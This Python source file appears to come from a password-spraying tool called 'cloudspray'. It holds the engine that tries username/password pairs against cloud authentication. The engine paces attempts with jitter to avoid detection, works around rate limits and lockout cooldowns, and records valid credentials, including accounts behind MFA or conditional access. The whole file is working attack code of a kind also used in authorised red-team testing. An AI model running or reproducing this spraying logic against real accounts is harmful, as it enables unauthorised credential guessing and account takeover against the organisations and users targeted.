import random
import time
from collections import deque
from datetime import datetime, timedelta, timezone

from cloudspray.config import CloudSprayConfig
from cloudspray.constants.error_codes import AuthResult
from cloudspray.reporting.console import ConsoleReporter
from cloudspray.spray.auth import Authenticator
from cloudspray.spray.shuffle import aggressive_shuffle, standard_shuffle
from cloudspray.state.db import StateDB
from cloudspray.state.models import LockedAccount, SprayAttempt, ValidCredential

_VALID_PASSWORD_RESULTS = {
    AuthResult.SUCCESS,
    AuthResult.VALID_PASSWORD_MFA_REQUIRED,
    AuthResult.VALID_PASSWORD_MFA_ENROLLMENT,
    AuthResult.VALID_PASSWORD_CA_BLOCKED,
    AuthResult.VALID_PASSWORD_EXPIRED,
}

RATE_LIMIT_SLEEP_SECONDS = 60


class SprayEngine:
    """Core password spray engine with per-user lockout cooldown and circuit breaker."""

    def __init__(
        self,
        config: CloudSprayConfig,
        db: StateDB,
        authenticator: Authenticator,
        reporter: ConsoleReporter,
    ):
        self._config = config
        self._db = db
        self._auth = authenticator
        self._reporter = reporter
        self._last_attempt_per_user: dict[str, datetime] = {}
        self._confirmed_users: set[str] = set()
        self._locked_users: dict[str, datetime] = {}
        self._consecutive_lockouts = 0

    def run(self, users: list[str], passwords: list[str], resume: bool = True) -> None:
        """Execute the spray campaign."""
        if not users or not passwords:
            self._reporter.error("No users or passwords provided.")
            return

        pairs = self._build_pairs(users, passwords)
        total_generated = len(pairs)

        if resume:
            attempted = self._db.get_attempted_pairs()
            if attempted:
                pairs = [(u, p) for u, p in pairs if (u, p) not in attempted]
                self._reporter.info(
                    f"Resuming: {total_generated - len(pairs)} already attempted, "
                    f"{len(pairs)} remaining"
                )

        for cred in self._db.get_valid_credentials():
            self._confirmed_users.add(cred.username)

        remaining = len(pairs)
        self._reporter.info(
            f"Starting spray: {remaining} attempts "
            f"({len(users)} users x {len(passwords)} passwords)"
        )

        progress, task_id = self._reporter.start_spray(remaining)
        queue: deque[tuple[str, str]] = deque(pairs)
        skipped: list[tuple[str, str]] = []

        try:
            while queue:
                username, password = queue.popleft()

                if username in self._confirmed_users:
                    self._reporter.update_progress(progress, task_id)
                    continue

                if self._is_locked(username):
                    skipped.append((username, password))
                    self._reporter.update_progress(progress, task_id)
                    continue

                self._enforce_user_delay(username)

                attempt = self._auth.attempt(username, password)
                self._last_attempt_per_user[username] = attempt.timestamp
                self._reporter.print_result(attempt)

                self._handle_result(attempt)

                if attempt.result != AuthResult.RATE_LIMITED:
                    self._db.record_attempt(attempt)
                else:
                    self._reporter.info(
                        f"Rate limited on {attempt.username}, "
                        f"sleeping {RATE_LIMIT_SLEEP_SECONDS}s then retrying..."
                    )
                    time.sleep(RATE_LIMIT_SLEEP_SECONDS)
                    queue.append((attempt.username, attempt.password))

                self._reporter.update_progress(progress, task_id)

                if self._consecutive_lockouts >= self._config.spray.lockout_threshold:
                    self._reporter.lockout_warning(self._consecutive_lockouts)
                    self._reporter.error(
                        f"{self._consecutive_lockouts} consecutive lockouts — "
                        "stopping spray to protect accounts."
                    )
                    break

            # Re-queue skipped users whose cooldown has expired
            if skipped and self._consecutive_lockouts < self._config.spray.lockout_threshold:
                ready = [(u, p) for u, p in skipped if not self._is_locked(u)]
                still_locked = [(u, p) for u, p in skipped if self._is_locked(u)]

                if ready:
                    self._reporter.info(
                        f"{len(ready)} previously locked user(s) ready for retry"
                    )
                    queue.extend(ready)

                if still_locked:
                    cooldown = self._config.spray.lockout_cooldown
                    locked_names = {u for u, _ in still_locked}
                    self._reporter.info(
                        f"{len(locked_names)} user(s) still in lockout cooldown "
                        f"({cooldown}s): {', '.join(sorted(locked_names))}"
                    )

                # Process the re-queued users
                while queue:
                    username, password = queue.popleft()

                    if username in self._confirmed_users:
                        continue

                    if self._is_locked(username):
                        continue

                    self._enforce_user_delay(username)

                    attempt = self._auth.attempt(username, password)
                    self._last_attempt_per_user[username] = attempt.timestamp
                    self._reporter.print_result(attempt)

                    self._handle_result(attempt)

                    if attempt.result != AuthResult.RATE_LIMITED:
                        self._db.record_attempt(attempt)

        finally:
            progress.stop()

        valid_creds = self._db.get_valid_credentials()
        self._reporter.summary_table(valid_creds)

    def _build_pairs(
        self, users: list[str], passwords: list[str]
    ) -> list[tuple[str, str]]:
        """Generate credential pairs based on the configured shuffle mode."""
        if self._config.spray.shuffle_mode == "aggressive":
            return aggressive_shuffle(users, passwords)
        return standard_shuffle(users, passwords)

    def _enforce_user_delay(self, username: str) -> None:
        """Sleep if necessary to respect the per-user delay window."""
        last_time = self._last_attempt_per_user.get(username)
        if last_time is None:
            return

        delay = self._config.spray.delay
        jitter = random.uniform(0, self._config.spray.jitter)
        required_gap = delay + jitter

        elapsed = (datetime.now(timezone.utc) - last_time).total_seconds()
        remaining_wait = required_gap - elapsed
        if remaining_wait > 0:
            time.sleep(remaining_wait)

    def _is_locked(self, username: str) -> bool:
        """Check if a user is in lockout cooldown."""
        locked_at = self._locked_users.get(username)
        if locked_at is None:
            return False

        cooldown = timedelta(seconds=self._config.spray.lockout_cooldown)
        if datetime.now(timezone.utc) - locked_at >= cooldown:
            del self._locked_users[username]
            return False

        return True

    def _handle_result(self, attempt: SprayAttempt) -> None:
        """Process an attempt result: record credentials, track lockouts."""
        result = attempt.result

        if result in _VALID_PASSWORD_RESULTS:
            mfa_type = ""
            if result == AuthResult.VALID_PASSWORD_MFA_REQUIRED:
                mfa_type = "required"
            elif result == AuthResult.VALID_PASSWORD_MFA_ENROLLMENT:
                mfa_type = "enrollment"
            elif result == AuthResult.VALID_PASSWORD_CA_BLOCKED:
                mfa_type = "ca_blocked"
            elif result == AuthResult.VALID_PASSWORD_EXPIRED:
                mfa_type = "expired"

            cred = ValidCredential(
                username=attempt.username,
                password=attempt.password,
                result=result,
                mfa_type=mfa_type,
            )
            self._db.record_valid_credential(cred)
            self._confirmed_users.add(attempt.username)
            self._consecutive_lockouts = 0
            return

        if result == AuthResult.ACCOUNT_LOCKED:
            self._locked_users[attempt.username] = datetime.now(timezone.utc)
            locked = LockedAccount(username=attempt.username)
            self._db.record_locked_account(locked)
            self._consecutive_lockouts += 1
            return

        # Any non-lockout result resets the consecutive counter
        self._consecutive_lockouts = 0
